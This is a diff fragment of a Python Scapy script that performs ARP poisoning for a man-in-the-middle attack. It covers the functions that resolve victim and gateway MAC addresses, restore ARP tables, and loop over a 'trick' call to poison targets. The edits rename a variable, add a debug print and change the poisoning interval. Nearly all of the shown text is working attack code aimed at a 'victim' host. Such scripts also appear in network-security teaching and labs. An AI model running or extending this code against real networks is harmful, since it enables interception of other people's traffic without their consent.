@@ -22,6 +22,7 @@ def get_mac(IP):
     conf.verb = 0
     ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2,
                      iface=interface, inter=0.1)
+    print(len(ans))
     for snd, rcv in ans:
         return rcv.sprintf(r"%Ether.src%")
 
@@ -29,11 +30,11 @@ def get_mac(IP):
 def reARP():
     print("Restoring targets...")
     victim_MAC = get_mac(victim_ip)
-    gate_mac = get_mac(gate_ip)
+    gate_MAC = get_mac(gate_ip)
     send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff",
              hwsrc=victim_MAC), count=7)
     send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst="ff:ff:ff:ff:ff:ff",
-             hwsrc=gate_mac), count=7)
+             hwsrc=gate_MAC), count=7)
     print("Disabling IP Forwarding")
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     print("Shutting down...")
@@ -55,7 +56,7 @@ def mitm():
         sys.exit(1)
 
     try:
-        gate_mac = get_mac(gate_ip)
+        gate_MAC = get_mac(gate_ip)
     except Exception:
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
         print("Couldn't find gateway MAC address")
@@ -65,8 +66,8 @@ def mitm():
     print("Poisoning Targets...")
     while 1:
         try:
-            trick(gate_mac, victim_MAC)
-            time.sleep(1.5)
+            trick(gate_MAC, victim_MAC)
+            time.sleep(5)
         except KeyboardInterrupt:
             reARP()
             break
